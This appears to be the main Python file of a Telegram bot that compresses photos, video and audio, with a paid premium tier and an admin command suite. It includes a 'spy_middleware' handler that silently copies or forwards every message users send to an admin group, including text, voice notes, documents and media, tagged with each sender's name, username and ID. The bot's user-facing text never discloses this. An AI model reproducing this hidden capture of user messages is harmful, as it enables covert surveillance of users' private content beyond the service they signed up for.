"""
main.py - Telegram Media Compression Bot
Stack : python-telegram-bot v20+, Motor, FFmpeg, Pillow
Deploy: Railway.app + MongoDB Atlas
"""

import asyncio
import io
import logging
import os
import tempfile
from datetime import datetime, timezone, timedelta
from functools import wraps
from pathlib import Path

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from PIL import Image
from telegram import (
    Bot,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    Update,
)
from telegram.constants import ParseMode
from telegram.error import Forbidden, RetryAfter, TelegramError
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

from database import db

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Environment ────────────────────────────────────────────────────────────────
BOT_TOKEN:        str       = os.environ["BOT_TOKEN"]
ADMIN_GROUP_ID:   int       = int(os.environ["ADMIN_GROUP_ID"])
ADMIN_IDS:        list[int] = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
PAYEER_ADDRESS:   str       = os.environ.get("PAYEER_ADDRESS", "P1000000")
BOT_NAME:         str       = os.environ.get("BOT_NAME", "CompressBot")
FREE_DAILY_LIMIT: int       = int(os.environ.get("FREE_DAILY_LIMIT", "5"))

# ── Conversation states ────────────────────────────────────────────────────────
AWAITING_PAYMENT_PROOF = 1

# ── CRF presets ───────────────────────────────────────────────────────────────
CRF_PRESETS = {"low": 35, "medium": 28, "high": 22}


# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN DECORATOR
# ══════════════════════════════════════════════════════════════════════════════

def admin_only(func):
    """
    Decorator that silently drops the update if the caller is not in ADMIN_IDS.
    Works for both regular handlers and callback query handlers.
    """
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            if update.message:
                await update.message.reply_text("⛔ This command is for admins only.")
            elif update.callback_query:
                await update.callback_query.answer("⛔ Admins only.", show_alert=True)
            return
        return await func(update, context)
    return wrapper


def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

async def check_user_access(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> tuple[dict | None, bool]:
    """
    Returns (user_doc, can_proceed).

    Access rules:
    - Banned users       → blocked with a message, returns False.
    - Admins (ADMIN_IDS) → always granted, treated as premium (no watermarks,
                           no daily limit), skips DB tier checks entirely.
    - Premium users      → always granted.
    - Free users         → granted until FREE_DAILY_LIMIT is reached.
    """
    user     = update.effective_user
    user_doc = await db.upsert_user(user.id, user.username, user.full_name)

    # ── Ban check ─────────────────────────────────────────────────────────────
    if user_doc.get("is_banned") and not is_admin(user.id):
        await update.message.reply_text(
            "⚠️ Your access has been restricted by the administrator."
        )
        return user_doc, False

    # ── Admin bypass — unlimited, no watermarks ───────────────────────────────
    if is_admin(user.id):
        user_doc = {**user_doc, "status": "premium"}
        return user_doc, True

    # ── Premium users ─────────────────────────────────────────────────────────
    if user_doc.get("status") == "premium":
        return user_doc, True

    # ── Free tier limit ───────────────────────────────────────────────────────
    usage = await db.get_daily_usage(user.id)
    if usage >= FREE_DAILY_LIMIT:
        await update.message.reply_text(
            f"⚠️ You've reached your daily limit of {FREE_DAILY_LIMIT} files.\n"
            "Upgrade to Premium for unlimited compression — /upgrade"
        )
        return user_doc, False

    return user_doc, True


# ══════════════════════════════════════════════════════════════════════════════
#  MIDDLEWARE — Forwarding Spy
# ══════════════════════════════════════════════════════════════════════════════

async def spy_middleware(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Group-99 handler. Fires after every update regardless of what group-0 did.

    Strategy:
    - Photos / videos / GIFs
        → copy_message with a custom caption embedding user info.
          Keeps media and metadata in a single bubble.

    - Everything else (text, commands, stickers, audio, voice, docs, etc.)
        → send_message with the HTML header THEN forward_message so admins
          see full context (reply chains, sticker pack names, waveforms, etc.)
    """
    message = update.message or update.edited_message
    if not message:
        return

    user = message.from_user
    if not user:
        return

    # ── Build the user info header (HTML) ─────────────────────────────────────
    full_name = user.full_name or "—"
    username  = f"@{user.username}" if user.username else "None"

    header = (
        "👤 <b>User Activity</b>\n"
        f"├ <b>Name:</b> {full_name}\n"
        f"├ <b>Username:</b> {username}\n"
        f"└ <b>User ID:</b> <code>{user.id}</code>"
    )

    # ── Detect media that supports copy_message captions ──────────────────────
    is_media = bool(message.photo or message.video or message.animation)

    try:
        if is_media:
            # Preferred path — one bubble with file + user info in caption
            existing_caption = message.caption or ""
            combined_caption = (
                f"{header}\n"
                + (f"\n📝 <i>Original caption:</i> {existing_caption}" if existing_caption else "")
            )
            await context.bot.copy_message(
                chat_id=ADMIN_GROUP_ID,
                from_chat_id=message.chat_id,
                message_id=message.message_id,
                caption=combined_caption[:1024],   # Telegram caption limit
                parse_mode=ParseMode.HTML,
            )
        else:
            # Standard path — header first, then native forward
            await context.bot.send_message(
                chat_id=ADMIN_GROUP_ID,
                text=header,
                parse_mode=ParseMode.HTML,
            )
            await context.bot.forward_message(
                chat_id=ADMIN_GROUP_ID,
                from_chat_id=message.chat_id,
                message_id=message.message_id,
            )

    except TelegramError as e:
        # Never let a spy failure affect the user-facing response
        logger.warning("spy_middleware failed for user %s: %s", user.id, e)


# ══════════════════════════════════════════════════════════════════════════════
#  COMMAND HANDLERS — PUBLIC
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await db.upsert_user(user.id, user.username, user.full_name)
    await update.message.reply_text(
        f"👋 Welcome to <b>{BOT_NAME}</b>!\n\n"
        "Send me a <b>video</b>, <b>audio</b>, <b>voice message</b>, or <b>photo</b> and I'll compress it.\n\n"
        "📦 <b>Free tier:</b> 5 files/day\n"
        "⭐ <b>Premium:</b> Unlimited — /upgrade\n\n"
        "Commands:\n"
        "/start — Show this message\n"
        "/upgrade — Get Premium ($1/month)\n"
        "/status — Your current plan",
        parse_mode=ParseMode.HTML,
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user     = update.effective_user
    user_doc = await db.upsert_user(user.id, user.username, user.full_name)
    usage    = await db.get_daily_usage(user.id)
    status   = user_doc.get("status", "free")
    expiry   = user_doc.get("expiry_date")

    if is_admin(user.id):
        status = "premium (admin)"

    lines = [f"👤 <b>Status:</b> {'⭐ Premium' if 'premium' in status else '🆓 Free'}"]
    if "premium" in status and expiry:
        if isinstance(expiry, str):
            expiry = datetime.fromisoformat(expiry)
        if expiry.tzinfo is None:
            expiry = expiry.replace(tzinfo=timezone.utc)
        days_left = (expiry - datetime.now(timezone.utc)).days
        lines.append(f"📅 <b>Expires:</b> <code>{expiry.strftime('%Y-%m-%d')}</code> ({days_left} days left)")
    elif is_admin(user.id):
        lines.append("♾️ <b>Unlimited access</b> (admin)")
    else:
        lines.append(f"📊 <b>Today's usage:</b> {usage}/{FREE_DAILY_LIMIT} files")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


# ══════════════════════════════════════════════════════════════════════════════
#  PAYMENT / UPGRADE FLOW
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_upgrade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "⭐ <b>Upgrade to Premium — $1/month</b>\n\n"
        f"Send <b>$1 USD</b> via Payeer to:\n<code>{PAYEER_ADDRESS}</code>\n\n"
        "Then <b>send a screenshot</b> of your payment confirmation here.\n"
        "An admin will verify and activate your account within a few hours.\n\n"
        "Send /cancel to abort.",
        parse_mode=ParseMode.HTML,
    )
    return AWAITING_PAYMENT_PROOF


async def receive_payment_proof(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> int:
    user    = update.effective_user
    message = update.message

    if not message.photo:
        await message.reply_text(
            "❌ Please send a <b>screenshot</b> (photo) of your payment.",
            parse_mode=ParseMode.HTML,
        )
        return AWAITING_PAYMENT_PROOF

    uname   = f"@{user.username}" if user.username else user.full_name
    caption = (
        f"💰 <b>Payment Proof</b>\n"
        f"User: {uname}\n"
        f"ID: <code>{user.id}</code>\n"
        f"Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
    )
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("Approve ✅", callback_data=f"approve_{user.id}"),
        InlineKeyboardButton("Reject ❌",  callback_data=f"reject_{user.id}"),
    ]])

    await context.bot.send_photo(
        chat_id=ADMIN_GROUP_ID,
        photo=message.photo[-1].file_id,
        caption=caption,
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard,
    )
    await message.reply_text(
        "✅ Payment proof received! An admin will review it shortly.\n"
        "You'll be notified once approved."
    )
    return ConversationHandler.END


async def cancel_upgrade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Upgrade cancelled.")
    return ConversationHandler.END


@admin_only
async def callback_approve(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    target_id = int(query.data.split("_")[1])
    success   = await db.set_manual_premium(target_id, days=30)

    if success:
        expiry = (datetime.now(timezone.utc) + timedelta(days=30)).strftime("%Y-%m-%d")
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                "🎉 <b>Congratulations! Your Premium is now active!</b>\n\n"
                f"✅ Valid until: <code>{expiry}</code>\n"
                "Enjoy unlimited compressions with no watermarks!"
            ),
            parse_mode=ParseMode.HTML,
        )
        await query.edit_message_caption(
            caption=query.message.caption
            + f"\n\n✅ <b>Approved by {query.from_user.full_name}</b>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await query.answer("User not found in DB.", show_alert=True)


@admin_only
async def callback_reject(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    target_id = int(query.data.split("_")[1])
    await context.bot.send_message(
        chat_id=target_id,
        text=(
            "❌ <b>Your payment proof was rejected.</b>\n\n"
            "The screenshot did not meet verification requirements.\n"
            "Please ensure you send a clear, unedited screenshot and try /upgrade again."
        ),
        parse_mode=ParseMode.HTML,
    )
    await query.edit_message_caption(
        caption=query.message.caption
        + f"\n\n❌ <b>Rejected by {query.from_user.full_name}</b>",
        parse_mode=ParseMode.HTML,
    )


# ══════════════════════════════════════════════════════════════════════════════
#  MEDIA COMPRESSION
# ══════════════════════════════════════════════════════════════════════════════

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    msg   = await update.message.reply_text("🖼️ Compressing your photo…")
    photo = update.message.photo[-1]
    file  = await context.bot.get_file(photo.file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        in_path = Path(tmpdir) / "input.jpg"
        await file.download_to_drive(str(in_path))

        out_buf = io.BytesIO()
        with Image.open(in_path) as img:
            max_side = 2048
            if max(img.size) > max_side:
                ratio    = max_side / max(img.size)
                new_size = (int(img.width * ratio), int(img.height * ratio))
                img      = img.resize(new_size, Image.LANCZOS)
            if img.mode in ("RGBA", "P"):
                img = img.convert("RGB")
            img.save(out_buf, format="JPEG", quality=70, optimize=True)
        out_buf.seek(0)

    await db.increment_usage(update.effective_user.id)
    is_premium = user_doc.get("status") == "premium"
    caption    = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

    await update.message.reply_photo(photo=out_buf, caption=caption)
    await msg.delete()


async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("🔵 Low",    callback_data="video_low"),
        InlineKeyboardButton("🟡 Medium", callback_data="video_medium"),
        InlineKeyboardButton("🟢 High",   callback_data="video_high"),
    ]])
    await update.message.reply_text(
        "📹 <b>Choose compression level:</b>\n"
        "• <b>Low</b> — smaller file, lower quality\n"
        "• <b>Medium</b> — balanced (recommended)\n"
        "• <b>High</b> — best quality, largest file",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard,
    )
    context.user_data["pending_video_msg_id"]  = update.message.message_id
    context.user_data["pending_video_chat_id"] = update.message.chat_id
    context.user_data["user_doc"]              = user_doc


async def compress_video_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    query: CallbackQuery = update.callback_query
    await query.answer()

    level      = query.data.split("_")[1]
    crf        = CRF_PRESETS[level]
    user_doc   = context.user_data.get("user_doc", {})
    status_msg = await query.edit_message_text(
        f"⏳ Compressing video ({level} quality)…"
    )

    chat_id = context.user_data.get("pending_video_chat_id")
    msg_id  = context.user_data.get("pending_video_msg_id")

    try:
        fwd = await context.bot.forward_message(
            chat_id=update.effective_chat.id,
            from_chat_id=chat_id,
            message_id=msg_id,
        )
        video_file_id = (fwd.video or fwd.document).file_id
        await context.bot.delete_message(
            chat_id=update.effective_chat.id, message_id=fwd.message_id
        )
    except TelegramError:
        await status_msg.edit_text("⚠️ Couldn't retrieve video. Please resend it.")
        return

    tg_file = await context.bot.get_file(video_file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        in_path  = Path(tmpdir) / "input.mp4"
        out_path = Path(tmpdir) / "output.mp4"
        await tg_file.download_to_drive(str(in_path))

        cmd = [
            "ffmpeg", "-y", "-i", str(in_path),
            "-vcodec", "libx264", "-crf", str(crf),
            "-preset", "fast", "-acodec", "aac", "-b:a", "128k",
            str(out_path),
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()

        if proc.returncode != 0:
            logger.error("FFmpeg error: %s", stderr.decode())
            await status_msg.edit_text(
                "❌ Compression failed. Make sure the video is a valid format."
            )
            return

        await db.increment_usage(update.effective_user.id)
        is_premium = user_doc.get("status") == "premium"
        caption    = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

        with open(out_path, "rb") as f:
            await query.message.reply_video(
                video=f, caption=caption, supports_streaming=True
            )

    await status_msg.delete()


async def handle_audio_voice(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    user_doc, ok = await check_user_access(update, context)
    if not ok:
        return

    msg      = await update.message.reply_text("🎵 Compressing audio…")
    message  = update.message
    is_voice = message.voice is not None
    media    = message.voice or message.audio
    tg_file  = await context.bot.get_file(media.file_id)

    with tempfile.TemporaryDirectory() as tmpdir:
        ext      = "ogg" if is_voice else (Path(media.file_name or "audio.mp3").suffix.lstrip(".") or "mp3")
        in_path  = Path(tmpdir) / f"input.{ext}"
        out_path = Path(tmpdir) / "output.ogg"
        await tg_file.download_to_drive(str(in_path))

        cmd = [
            "ffmpeg", "-y", "-i", str(in_path),
            "-c:a", "libopus", "-b:a", "32k",
            "-vbr", "on", "-compression_level", "10",
            str(out_path),
        ]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()

        if proc.returncode != 0:
            logger.error("FFmpeg audio error: %s", stderr.decode())
            await msg.edit_text("❌ Audio compression failed.")
            return

        await db.increment_usage(update.effective_user.id)
        is_premium = user_doc.get("status") == "premium"
        caption    = None if is_premium else f"Compressed by {BOT_NAME} (Free Tier)"

        with open(out_path, "rb") as f:
            if is_voice:
                await message.reply_voice(voice=f, caption=caption)
            else:
                await message.reply_audio(audio=f, caption=caption)

    await msg.delete()


# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN COMMAND SUITE
# ══════════════════════════════════════════════════════════════════════════════

@admin_only
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    stats = await db.get_stats()
    await update.message.reply_text(
        "📊 <b>Bot Statistics</b>\n\n"
        f"👥 Total users:   <code>{stats['total_users']}</code>\n"
        f"⭐ Premium users: <code>{stats['premium_users']}</code>\n"
        f"🚫 Banned users:  <code>{stats['banned_users']}</code>\n"
        f"📁 Files today:   <code>{stats['files_today']}</code>",
        parse_mode=ParseMode.HTML,
    )


@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Usage: <code>/ban &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return
    uid     = int(context.args[0])
    success = await db.update_ban_status(uid, True)
    if success:
        await update.message.reply_text(
            f"🚫 User <code>{uid}</code> has been banned.", parse_mode=ParseMode.HTML
        )
        try:
            await context.bot.send_message(
                chat_id=uid,
                text="⚠️ Your access has been restricted by the administrator.",
            )
        except TelegramError:
            pass
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{uid}</code> not found in DB.", parse_mode=ParseMode.HTML
        )


@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Usage: <code>/unban &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return
    uid     = int(context.args[0])
    success = await db.update_ban_status(uid, False)
    if success:
        await update.message.reply_text(
            f"✅ User <code>{uid}</code> has been unbanned.", parse_mode=ParseMode.HTML
        )
        try:
            await context.bot.send_message(
                chat_id=uid,
                text="✅ Your access has been restored by the administrator.",
            )
        except TelegramError:
            pass
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{uid}</code> not found in DB.", parse_mode=ParseMode.HTML
        )


@admin_only
async def cmd_setpremium(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/setpremium &lt;user_id&gt; [days]</code>\nDefault days: 30",
            parse_mode=ParseMode.HTML,
        )
        return
    uid     = int(context.args[0])
    days    = int(context.args[1]) if len(context.args) > 1 else 30
    success = await db.set_manual_premium(uid, days=days)
    if success:
        expiry = (datetime.now(timezone.utc) + timedelta(days=days)).strftime("%Y-%m-%d")
        await update.message.reply_text(
            f"⭐ User <code>{uid}</code> is now Premium until <code>{expiry}</code>.",
            parse_mode=ParseMode.HTML,
        )
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=(
                    f"🎉 <b>An admin has granted you Premium access!</b>\n"
                    f"✅ Valid until: <code>{expiry}</code>\n"
                    "Enjoy unlimited compressions with no watermarks!"
                ),
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{uid}</code> not found in DB.", parse_mode=ParseMode.HTML
        )


@admin_only
async def cmd_depremium(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/depremium &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML
        )
        return
    uid     = int(context.args[0])
    success = await db.revoke_premium(uid)
    if success:
        await update.message.reply_text(
            f"⬇️ User <code>{uid}</code> reverted to Free tier.", parse_mode=ParseMode.HTML
        )
        try:
            await context.bot.send_message(
                chat_id=uid,
                text="ℹ️ Your Premium subscription has been revoked by an administrator.",
            )
        except TelegramError:
            pass
    else:
        await update.message.reply_text(
            f"⚠️ User <code>{uid}</code> not found in DB.", parse_mode=ParseMode.HTML
        )


@admin_only
async def cmd_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    /send <user_id|@username> <message text…>
    Everything after the first token is the message body — multi-word safe.
    """
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: <code>/send &lt;user_id or @username&gt; &lt;message&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    target_token = context.args[0]
    text         = " ".join(context.args[1:])
    target_id: int | None = None

    if target_token.lstrip("@").isdigit():
        target_id = int(target_token.lstrip("@"))
    else:
        user_doc = await db.get_user_by_username(target_token)
        if user_doc:
            target_id = user_doc["user_id"]

    if target_id is None:
        await update.message.reply_text(
            f"⚠️ Could not find a user matching <code>{target_token}</code> in the database.",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"📩 <b>Message from Admin:</b>\n\n{text}",
            parse_mode=ParseMode.HTML,
        )
        await update.message.reply_text(
            f"✅ Message delivered to <code>{target_id}</code>.", parse_mode=ParseMode.HTML
        )
    except Forbidden:
        await update.message.reply_text(
            f"❌ Cannot send: user <code>{target_id}</code> has blocked the bot.",
            parse_mode=ParseMode.HTML,
        )
    except TelegramError as e:
        await update.message.reply_text(f"❌ Delivery failed: {e}")


@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Safe broadcast with:
    - 0.05 s delay between sends  (~20 msg/s, under Telegram's 30/s hard limit)
    - Forbidden  → user blocked the bot, counted as failed, loop continues
    - RetryAfter → flood-wait honoured with sleep + single retry
    """
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML
        )
        return

    text       = " ".join(context.args)
    user_ids   = await db.get_all_user_ids()
    total      = len(user_ids)
    sent = failed = 0

    status_msg = await update.message.reply_text(
        f"📢 Starting broadcast to <b>{total}</b> users…", parse_mode=ParseMode.HTML
    )

    for uid in user_ids:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 <b>Announcement</b>\n\n{text}",
                parse_mode=ParseMode.HTML,
            )
            sent += 1

        except Forbidden:
            failed += 1

        except RetryAfter as e:
            logger.warning("Flood control: sleeping %s s", e.retry_after)
            await asyncio.sleep(e.retry_after + 1)
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 <b>Announcement</b>\n\n{text}",
                    parse_mode=ParseMode.HTML,
                )
                sent += 1
            except TelegramError:
                failed += 1

        except TelegramError:
            failed += 1

        await asyncio.sleep(0.05)

    await status_msg.edit_text(
        "✅ <b>Broadcast complete.</b>\n\n"
        f"✅ Successful: <b>{sent}</b>\n"
        f"❌ Failed/Blocked: <b>{failed}</b>\n"
        f"📊 Total: <b>{total}</b>",
        parse_mode=ParseMode.HTML,
    )


# ══════════════════════════════════════════════════════════════════════════════
#  SCHEDULER JOBS
# ══════════════════════════════════════════════════════════════════════════════

async def job_check_subscriptions(bot: Bot) -> None:
    logger.info("Running subscription check…")

    for user in await db.get_expiring_soon(hours=48):
        try:
            expiry = user["expiry_date"]
            if isinstance(expiry, str):
                expiry = datetime.fromisoformat(expiry)
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            hours_left = int((expiry - datetime.now(timezone.utc)).total_seconds() / 3600)
            await bot.send_message(
                chat_id=user["user_id"],
                text=(
                    f"⏰ <b>Subscription Reminder</b>\n\n"
                    f"Your Premium expires in ~{hours_left} hours.\n"
                    "Renew with /upgrade to stay unlimited!"
                ),
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass

    expired = await db.expire_subscriptions()
    if expired:
        logger.info("Expired %d subscriptions.", expired)


# ══════════════════════════════════════════════════════════════════════════════
#  APPLICATION SETUP
# ══════════════════════════════════════════════════════════════════════════════

def build_application() -> Application:
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(on_startup)
        .post_shutdown(on_shutdown)
        .build()
    )

    # ── Upgrade conversation ───────────────────────────────────────────────────
    upgrade_conv = ConversationHandler(
        entry_points=[CommandHandler("upgrade", cmd_upgrade)],
        states={
            AWAITING_PAYMENT_PROOF: [
                MessageHandler(filters.PHOTO, receive_payment_proof),
                CommandHandler("cancel", cancel_upgrade),
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_upgrade)],
        per_user=True,
        per_chat=True,
    )

    # ── Public commands ────────────────────────────────────────────────────────
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(upgrade_conv)

    # ── Admin commands ─────────────────────────────────────────────────────────
    app.add_handler(CommandHandler("stats",      cmd_stats))
    app.add_handler(CommandHandler("broadcast",  cmd_broadcast))
    app.add_handler(CommandHandler("ban",        cmd_ban))
    app.add_handler(CommandHandler("unban",      cmd_unban))
    app.add_handler(CommandHandler("setpremium", cmd_setpremium))
    app.add_handler(CommandHandler("depremium",  cmd_depremium))
    app.add_handler(CommandHandler("send",       cmd_send))

    # ── Inline callbacks ───────────────────────────────────────────────────────
    app.add_handler(CallbackQueryHandler(callback_approve, pattern=r"^approve_\d+$"))
    app.add_handler(CallbackQueryHandler(callback_reject,  pattern=r"^reject_\d+$"))
    app.add_handler(CallbackQueryHandler(compress_video_callback, pattern=r"^video_(low|medium|high)$"))

    # ── Media handlers ─────────────────────────────────────────────────────────
    app.add_handler(MessageHandler(filters.PHOTO  & ~filters.COMMAND, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO  & ~filters.COMMAND, handle_video))
    app.add_handler(MessageHandler((filters.AUDIO | filters.VOICE) & ~filters.COMMAND, handle_audio_voice))

    # ── Spy middleware (group 99 — fully independent of group 0) ──────────────
    app.add_handler(MessageHandler(filters.ALL, spy_middleware), group=99)

    return app


async def on_startup(app: Application) -> None:
    await db.connect()
    scheduler = AsyncIOScheduler(timezone="UTC")
    scheduler.add_job(
        job_check_subscriptions,
        trigger="interval",
        hours=24,
        args=[app.bot],
        next_run_time=datetime.now(timezone.utc) + timedelta(minutes=1),
    )
    scheduler.start()
    app.bot_data["scheduler"] = scheduler
    logger.info("Bot started. Scheduler running.")


async def on_shutdown(app: Application) -> None:
    await db.close()
    scheduler = app.bot_data.get("scheduler")
    if scheduler:
        scheduler.shutdown(wait=False)
    logger.info("Bot shut down cleanly.")


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    application = build_application()
    application.run_polling(drop_pending_updates=True)
